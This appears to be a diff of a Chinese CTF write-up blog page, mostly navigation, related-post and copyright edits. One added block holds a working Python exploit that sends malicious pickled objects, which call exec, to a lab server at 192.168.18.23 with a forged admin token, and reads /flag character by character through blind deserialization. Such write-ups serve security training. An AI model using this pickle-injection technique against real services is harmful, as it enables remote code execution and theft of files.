@@ -356,6 +356,11 @@
 
 
 
+<p>也可以盲注：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> string.digits+string.ascii_lowercase:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">exec</span>,(<span class="string">f&quot;if(open(&#x27;/flag&#x27;).read()[<span class="subst">&#123;i&#125;</span>]==&#x27;<span class="subst">&#123;x&#125;</span>&#x27;):a()&quot;</span>,)</span><br><span class="line"></span><br><span class="line">        data = base64.b64encode(pickle.dumps(test())).decode()</span><br><span class="line">        res = requests.post(<span class="string">&quot;http://192.168.18.23/ser&quot;</span>,json=&#123;<span class="string">&quot;pickled&quot;</span>:data&#125;,headers=&#123;<span class="string">&quot;Authorization&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc5MTE0MzgyN30.e_mDxsbfK4iM9EMthTW_u83zzL0zlP2bY0NbLotD8nE&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;defined&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(x,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
 <h2 id="LookUP-pcb2024"><a href="#LookUP-pcb2024" class="headerlink" title="LookUP-pcb2024"></a>LookUP-pcb2024</h2><p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Goo1/p/17592281.html">https://www.cnblogs.com/Goo1/p/17592281.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12966#toc-34">https://xz.aliyun.com/t/12966#toc-34</a></p>
@@ -390,6 +395,10 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
+			<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp" rel="prev">
+				&laquo;上一篇
+			</a>
+		
 		
 			<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" title="强网杯2024" rel="next">
 				下一篇&raquo;
@@ -409,6 +418,29 @@
 <div class="relate-post">
 	
 		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">
+								SUCTF 2025 WEB部分wp			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								一月 14日, 2025				
+							</p>
+							<p class="relate-post-content">
+								SU_photogallery
+尝试源码泄露 https://www.cnblogs.com/Kawakaze777/p/17799235.html![e0dcf5e1-a150-4c37-bd6e-bf45ea40a99b](img...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2025/01/14/SUCTF2025/" title="SUCTF 2025 WEB部分wp">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/SUCTF2025/SUCTF2025.jpg" alt="SUCTF 2025 WEB部分wp"/>
+							</a>
+						</div>
+					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -587,8 +619,8 @@ flag没有权...
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">
-								PolarCTF2024夏季个人挑战赛wp			
+							<a class="relate-post-title" href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">
+								PolarCTF2024夏季个人挑战赛全wp			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
@@ -608,17 +640,17 @@ flag{72077a55w312584wb1aaa88888cd...
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛wp">				
+							<a href="/2024/06/10/PolarCTF2024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024夏季个人挑战赛全wp">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛wp"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024夏季个人挑战赛全wp"/>
 							</a>
 						</div>
 					</li>												
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">
-								PolarCTF2024春季个人挑战赛wp			
+							<a class="relate-post-title" href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛全wp">
+								PolarCTF2024春季个人挑战赛全wp			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
@@ -635,35 +667,9 @@ flag{72077a55w312584wb1aaa88888cd...
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛wp">				
+							<a href="/2024/04/30/PolarCTF2024%E6%98%A5%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9Bwp/" title="PolarCTF2024春季个人挑战赛全wp">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024春季个人挑战赛wp"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">
-								第九届中国海洋大学信息安全竞赛web题解			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								四月 26日, 2024				
-							</p>
-							<p class="relate-post-content">
-								ezPHPparse_str()可以进行变量覆盖。
-全部流量包：
-
-菜狗工具#1python继承链攻击。
-1print(().__class__.__base__.__subclasses__()[132].__init__.__gl...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/04/26/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/" title="第九届中国海洋大学信息安全竞赛web题解">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/第九届中国海洋大学信息安全竞赛web题解/blue-whale_logo.png" alt="第九届中国海洋大学信息安全竞赛web题解"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/PolarCTF2024春季个人挑战赛wp/polarctf.png" alt="PolarCTF2024春季个人挑战赛全wp"/>
 							</a>
 						</div>
 					</li>												
@@ -954,7 +960,7 @@ flag{72077a55w312584wb1aaa88888cd...
 	<div class="copyright">
 		<p>
 			 
-				&copy;2024, content by Infernity. All Rights Reserved.
+				&copy;2024 - 2025, content by Infernity. All Rights Reserved.
 			
 			
 				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
